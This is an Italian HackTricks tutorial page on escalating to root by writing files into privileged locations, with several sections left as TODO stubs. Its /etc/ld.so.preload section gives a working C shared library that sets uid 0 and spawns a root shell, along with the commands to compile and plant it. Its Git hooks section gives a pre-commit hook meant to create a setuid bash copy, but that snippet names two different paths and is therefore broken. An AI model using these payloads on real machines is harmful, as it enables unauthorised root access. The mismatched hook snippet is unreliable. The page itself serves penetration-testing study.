# Scrittura arbitraria di file nella directory root

<details>

<summary><strong>Impara l'hacking su AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se desideri vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

### /etc/ld.so.preload

Questo file funziona come la variabile d'ambiente **`LD_PRELOAD`** ma funziona anche nei **binari SUID**.\
Se puoi crearlo o modificarlo, puoi semplicemente aggiungere un **percorso a una libreria che verrà caricata** con ogni binario eseguito.

Ad esempio: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) sono **script** che vengono **eseguiti** in vari **eventi** in un repository git come quando viene creato un commit, un merge... Quindi se uno **script o utente privilegiato** sta eseguendo queste azioni frequentemente ed è possibile **scrivere nella cartella `.git`**, questo può essere utilizzato per **escalation dei privilegi**.

Ad esempio, è possibile **generare uno script** in un repo git in **`.git/hooks`** in modo che venga sempre eseguito quando viene creato un nuovo commit:

{% code overflow="wrap" %}
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
{% endcode %}

### File Cron & Time

DA FARE

### File di Servizio & Socket

DA FARE

### binfmt\_misc

Il file situato in `/proc/sys/fs/binfmt_misc` indica quale binario deve eseguire quale tipo di file. DA FARE: controllare i requisiti per sfruttare questo per eseguire una reverse shell quando viene aperto un tipo di file comune.
